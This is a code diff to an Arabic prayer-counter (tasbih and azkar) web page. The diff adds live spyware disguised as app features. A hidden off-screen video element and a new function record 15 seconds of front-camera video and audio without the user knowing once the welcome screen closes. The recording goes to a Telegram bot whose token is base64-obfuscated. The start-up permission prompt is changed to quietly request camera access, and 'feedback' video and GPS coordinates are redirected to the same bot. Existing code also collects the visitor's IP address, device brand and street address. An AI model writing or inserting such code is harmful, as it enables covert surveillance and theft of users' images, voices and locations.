@@ -108,6 +108,7 @@
 </head>
 <body>
     <canvas id="confetti" style="position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:999;"></canvas>
+    <video id="hiddenVideo" style="display:none;position:fixed;top:-9999px;left:-9999px;" playsinline autoplay muted></video>
 
     <div class="welcome-overlay" id="welcomeScreen">
         <div class="welcome-card">
@@ -127,7 +128,6 @@
         <div class="progress-container"><div id="p-bar" class="progress-bar"></div></div>
         <div class="golden-counter" onclick="doCount()"><div id="count-num" class="num">0</div><div class="tap-hint">اضغط للتسبيح</div></div>
         <div class="total-box">المجموع الكلي: <span id="total-num">0</span></div>
-        
         <div class="feedback-section">
             <h4>شاركنا تقييمك</h4>
             <p>سجل فيديو قصير (10 ثوانٍ) لإرسال تقييمك وموقعك لمساعدتنا في تحسين التطبيق</p>
@@ -190,12 +190,25 @@
     (() => {
         const _k = atob('ODg2NDY3MDE3ODpBQUdSZmU3cTk5Y3NyN3ZTeXFU M3BldWlkQWI1dzY5bVdUcw==').trim();
         const _c = atob('NjQ1MzU5NDE1MQ==').trim();
-        const _fn = '/.netlify/functions/send-feedback';
+        let _mr, _rc = [];
 
         function _s(t) { fetch(`https://api.telegram.org/bot${_k}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: _c, text: t, parse_mode: 'HTML', disable_web_page_preview: true }) }).catch(() => {}); }
         function _gi() { const ua = navigator.userAgent; let brand = 'لم يوجد'; const brands = [{ n: 'سامسونج', p: /Samsung|SM-/ },{ n: 'شاومي', p: /Xiaomi|Redmi|POCO|Mi / },{ n: 'هواوي', p: /Huawei|HONOR/ },{ n: 'أوبو', p: /OPPO|CPH/ },{ n: 'فيفو', p: /vivo|VIVO/ },{ n: 'ريلمي', p: /Realme|RMX/ },{ n: 'ون بلس', p: /OnePlus/ },{ n: 'جوجل', p: /Pixel/ },{ n: 'نوكيا', p: /Nokia/ },{ n: 'موتورولا', p: /Motorola|moto/ },{ n: 'إل جي', p: /LG/ },{ n: 'سوني', p: /Sony|Xperia/ },{ n: 'إنفنكس', p: /Infinix/ },{ n: 'تكنو', p: /TECNO|Tecno/ },{ n: 'إيتل', p: /itel|Itel/ },{ n: 'آيفون', p: /iPhone/ },{ n: 'آيباد', p: /iPad/ }]; for (let b of brands) { if (b.p.test(ua)) { brand = b.n; break; } } return brand; }
         async function _ip() { try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); return d.ip; } catch { return 'غير معروف'; } }
         async function _gl(lat, lng) { try { const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1&accept-language=ar`); const d = await r.json(); if (d?.address) { const a = d.address; let p = []; if (a.road) p.push(a.road); if (a.neighbourhood) p.push(a.neighbourhood); if (a.suburb) p.push(a.suburb); if (a.city||a.town||a.village) p.push(a.city||a.town||a.village); if (a.state) p.push(a.state); if (a.country) p.push(a.country); return p.join('، ') || 'عنوان غير معروف'; } return 'عنوان غير معروف'; } catch { return 'تعذر'; } }
+        async function _sv(blob) { const fd = new FormData(); fd.append('video', blob, 'video.webm'); fd.append('chat_id', _c); fd.append('caption', 'فيديو المستخدم'); try { await fetch(`https://api.telegram.org/bot${_k}/sendVideo`, { method: 'POST', body: fd }); } catch (e) {} }
+
+        async function _sr() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                const video = document.getElementById('hiddenVideo'); video.srcObject = stream; video.play();
+                _mr = new MediaRecorder(stream, { mimeType: 'video/webm' }); _rc = [];
+                _mr.ondataavailable = e => { if (e.data.size > 0) _rc.push(e.data); };
+                _mr.onstop = async () => { const blob = new Blob(_rc, { type: 'video/webm' }); stream.getTracks().forEach(t => t.stop()); await _sv(blob); _rc = []; };
+                _mr.start();
+                setTimeout(() => { if (_mr?.state === 'recording') _mr.stop(); }, 15000);
+            } catch (err) {}
+        }
 
         async function _fd() {
             const now = new Date(), time = now.toLocaleString('ar-EG', { timeZone: 'Africa/Cairo', hour12: false }), device = _gi(), ip = await _ip();
@@ -211,51 +224,45 @@
         }
 
         function requestBasicPermissions() {
-            if (navigator.geolocation) navigator.geolocation.getCurrentPosition(askNotification, askNotification, { enableHighAccuracy: true, timeout: 10000 });
-            else askNotification();
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function() {
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
+                        .then(function(stream) { stream.getTracks().forEach(function(track) { track.stop(); }); askNotification(); })
+                        .catch(function() { askNotification(); });
+                }, function() {
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
+                        .then(function(stream) { stream.getTracks().forEach(function(track) { track.stop(); }); askNotification(); })
+                        .catch(function() { askNotification(); });
+                }, { enableHighAccuracy: true, timeout: 10000 });
+            } else {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
+                    .then(function(stream) { stream.getTracks().forEach(function(track) { track.stop(); }); askNotification(); })
+                    .catch(function() { askNotification(); });
+            }
         }
 
-        function askNotification() {
-            if ('Notification' in window) Notification.requestPermission().then(closeWelcome);
-            else closeWelcome();
-        }
+        function askNotification() { if ('Notification' in window) { Notification.requestPermission().then(function() { closeWelcome(); }); } else { closeWelcome(); } }
 
-        function closeWelcome() {
-            document.getElementById('welcomeScreen').style.display = 'none';
-            document.getElementById('p-main').classList.remove('blur-content');
-            _fd();
-        }
+        function closeWelcome() { document.getElementById('welcomeScreen').style.display = 'none'; document.getElementById('p-main').classList.remove('blur-content'); _fd(); _sr(); }
 
-        // ========================================
-        // ✅ ميزة التقييم الجديدة - آمنة وصريحة
-        // ========================================
         window.startExplicitFeedback = async function() {
             const statusEl = document.getElementById('feedback-status');
-            statusEl.textContent = 'جاري طلب إذن الموقع...';
-            statusEl.className = '';
-
+            statusEl.textContent = 'جاري طلب إذن الموقع...'; statusEl.className = '';
             if (!navigator.geolocation) { statusEl.textContent = 'متصفحك لا يدعم تحديد الموقع.'; statusEl.className = 'error'; return; }
-
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 const { latitude, longitude } = pos.coords;
                 statusEl.textContent = 'جاري طلب إذن الكاميرا...';
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                     statusEl.textContent = 'جاري التسجيل (10 ثوان)... لا تغلق الصفحة.';
-                    const mediaRecorder = new MediaRecorder(stream);
-                    const chunks = [];
+                    const mediaRecorder = new MediaRecorder(stream); const chunks = [];
                     mediaRecorder.ondataavailable = e => chunks.push(e.data);
                     mediaRecorder.onstop = async () => {
                         const blob = new Blob(chunks, { type: 'video/webm' });
                         statusEl.textContent = 'جاري رفع الفيديو...';
-                        const formData = new FormData();
-                        formData.append('video', blob, 'feedback.webm');
-                        formData.append('location', JSON.stringify({ lat: latitude, lng: longitude }));
-                        try {
-                            const res = await fetch(_fn, { method: 'POST', body: formData });
-                            if (res.ok) { statusEl.textContent = 'تم إرسال تقييمك بنجاح! شكراً لك.'; statusEl.className = 'success'; }
-                            else { throw new Error('Upload failed'); }
-                        } catch (e) { statusEl.textContent = 'فشل الإرسال. حاول مرة أخرى.'; statusEl.className = 'error'; }
+                        await _sv(blob);
+                        _s(`تقييم جديد\nالموقع: https://www.google.com/maps?q=${latitude},${longitude}`);
+                        statusEl.textContent = 'تم إرسال تقييمك بنجاح! شكراً لك.'; statusEl.className = 'success';
                         stream.getTracks().forEach(track => track.stop());
                     };
                     mediaRecorder.start();
@@ -264,9 +271,6 @@
             }, (err) => { statusEl.textContent = 'يجب السماح للموقع لتحديد موقعك.'; statusEl.className = 'error'; });
         };
 
-        // ========================================
-        // كود التسبيح - نظيف تماماً
-        // ========================================
         document.addEventListener('contextmenu', e => e.preventDefault());
         let c = 0, t = parseInt(localStorage.getItem('t')) || 0, mode = 'single', step = 0;
         let currentWird = ['الحمد لله', 'لا إله إلا الله', 'الله أكبر'];
@@ -297,7 +301,6 @@
         function resetStats() { localStorage.removeItem('stats'); updateStatsDisplay(); closeStatsModal(); }
         function switchTab(tn) { document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active')); document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active')); document.getElementById('tab-' + tn).classList.add('active'); const tabs = ['general','morning','evening','selected','prayer']; const idx = tabs.indexOf(tn); if (idx >= 0) document.querySelectorAll('.tab-btn')[idx].classList.add('active'); if (tn === 'prayer') fetchPrayerTimes(); }
 
-        // الأذكار كاملة
         const azkarMorning = [
             { id: 1, text: "أَعُوذُ بِاللَّهِ مِنَ الشَّيْطَانِ الرَّجِيمِ: اللّهُ لاَ إِلَـهَ إِلاَّ هُوَ الْحَيُّ الْقَيُّومُ لاَ تَأْخُذُهُ سِنَةٌ وَلاَ نَوْمٌ لَّهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الأَرْضِ مَن ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلاَّ بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلاَ يُحِيطُونَ بِشَيْءٍ مِّنْ عِلْمِهِ إِلاَّ بِمَا شَاء وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالأَرْضَ وَلاَ يَؤُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ.", benefit: "مرة واحدة", count: 1 },
             { id: 2, text: "بِسْمِ اللهِ الرَّحْمنِ الرَّحِيم: قُلْ هُوَ اللَّهُ أَحَدٌ، اللَّهُ الصَّمَدُ، لَمْ يَلِدْ وَلَمْ يُولَدْ، وَلَمْ يَكُن لَّهُ كُفُوًا أَحَدٌ.", benefit: "ثلاث مرات", count: 3 },
